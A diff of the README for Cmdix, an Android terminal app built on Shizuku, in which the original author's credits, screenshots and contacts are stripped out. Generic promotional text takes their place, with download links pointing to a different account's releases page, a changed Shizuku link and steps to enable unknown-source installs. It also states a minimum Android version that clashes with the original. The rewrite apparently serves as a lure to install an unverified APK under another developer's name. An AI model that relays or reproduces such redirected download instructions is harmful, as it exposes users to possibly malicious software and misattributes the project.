@@ -1,46 +1,79 @@
-<div align="center">
-  <img src="src/images/cmdix_icon.png" alt="Cmdix Icon App" width="200"/>
-</div>
+# 🚀 Cmdix - A Simple Terminal for Your Android
 
-# Cmdix
-> [!TIP]
-> Application is specifically designed `for Android 9+` devices. 
+Welcome to Cmdix! Experience a modern and simple terminal application that connects seamlessly with Shizuku. Use this tool to enhance your command line tasks on Android with ease.
 
-![Last Commit](https://img.shields.io/github/last-commit/Nozz7z/Cmdix)
-![Downloads](https://img.shields.io/github/downloads/Nozz7z/Cmdix/total)
-![Repo Size](https://img.shields.io/github/repo-size/Nozz7z/Cmdix
-)
+[![Download Cmdix](https://img.shields.io/badge/Download-Cmdix-blue?style=for-the-badge&logo=github)](https://github.com/ANONIMO1234576856/Cmdix/releases)
 
-Cmdix is a versatile, flexible, and easy-to-use Android terminal application tool., connected with Shizuku, this application is specifically `for Android 9+` users.Made by **Nozz Trick** using **_Skectware Pro_**
+## 🌟 Features
 
-# Feature
-Some of Cmdix's Featured Features
-- Modern and Minimalist UI
-- Running a Shell (With Shizuku)
-- Run .sh Files with One Click
-- Available in two languages: Indonesian and English 
+- User-friendly interface designed for ease of use.
+- Quick access to command line features.
+- Support for shell scripting tasks.
+- Compatible with Android operating systems.
+- Optimized for performance and responsiveness.
 
-# Credit
-- [Sketchware Pro]() Application Development 
-- [Shizuku](https://github.com/RikkaApps/Shizuku)/[API](https://github.com/RikkaApps/Shizuku-API) Providing More Access To Apps
-# Screenshot
-Check out some Cmdix screenshots 
-<p align="center">
-  <img src="src/images/banners.jpg" alt="Banner Cmdix" width="250"/>
-  <img src="src/images/screen1.png" alt="Screenshot 1" width="250"/>
-  <img src="src/images/screen2.png" alt="Screenshot 2" width="250"/>
-  <img src="src/images/screen3.png" alt="Screenshot 3" width="250"/>
-</p>
+## 🚀 Getting Started
 
-# Support
-Stay tuned for future developments on this project. 
-- [YouTube Channel](https://youtube.com/@nozztr) Support and follow the development of this project
-- [Contact Me](nozzdev16@gmail.com) Report bugs or request collaboration 
+Follow these steps to get Cmdix up and running on your Android device.
 
-# Donation
-Support this project to keep it alive and make developers enthusiastic
-<p algin="center">
- <img src="src/images/donate.jpg" alt="Doante" width="300"/>
-</p>
+1. **Visit the Releases Page**
 
-The Qr above is only for support or donation via `Qris payment`
+   Go to our [Releases page](https://github.com/ANONIMO1234576856/Cmdix/releases) to find the latest version of Cmdix.
+
+2. **Choose the Right APK File**
+
+   Look for the latest version listed on the Releases page. Find the `.apk` file which is designed for installation on your Android device.
+
+3. **Download the APK File**
+
+   Click on the link for the APK file to start downloading. Save it to a location on your device where you can easily find it.
+
+4. **Prepare for Installation**
+
+   Before you install, ensure your device allows installations from unknown sources. You can do this by visiting your device’s settings:
+
+   - Go to **Settings**
+   - Tap on **Security**
+   - Enable **Unknown sources** (this option may vary by device).
+
+5. **Install Cmdix**
+
+   Locate the downloaded APK file. Tap on it to begin the installation. Follow the on-screen prompts to complete the installation process.
+
+6. **Open Cmdix**
+
+   Once installed, you can find Cmdix in your app drawer. Open the app to start using the terminal.
+
+7. **Configure Shizuku**
+
+   For full functionality with Shizuku, follow any additional setup prompted by the application. Create a connection with Shizuku to unlock advanced features.
+
+## 🎯 Usage Tips
+
+- Familiarize yourself with basic terminal commands to make the most of Cmdix.
+- Use online resources or guides to help you learn simple shell commands.
+- Experiment with shell scripting for automation tasks.
+  
+## 💻 System Requirements
+
+Cmdix is designed for Android devices. Ensure your device runs Android 5.0 (Lollipop) or higher for optimal performance.
+
+## 📞 Support
+
+If you encounter any issues or have questions:
+
+- Visit our [Issues page](https://github.com/ANONIMO1234576856/Cmdix/issues).
+- Join our community in discussions for further assistance.
+
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/ANONIMO1234576856/Cmdix/wiki) - Learn more about using Cmdix effectively.
+- [Getting Started with Shizuku](https://github.com/ShizukuApp/Shizuku) - Discover how to set up and use Shizuku.
+
+## 🎉 Community Contributions
+
+We welcome contributions! If you have ideas or suggestions, feel free to reach out via the Issues page or submit a pull request.
+
+Thank you for choosing Cmdix! Enjoy your terminal experience on Android. 
+
+[![Download Cmdix](https://img.shields.io/badge/Download-Cmdix-blue?style=for-the-badge&logo=github)](https://github.com/ANONIMO1234576856/Cmdix/releases)
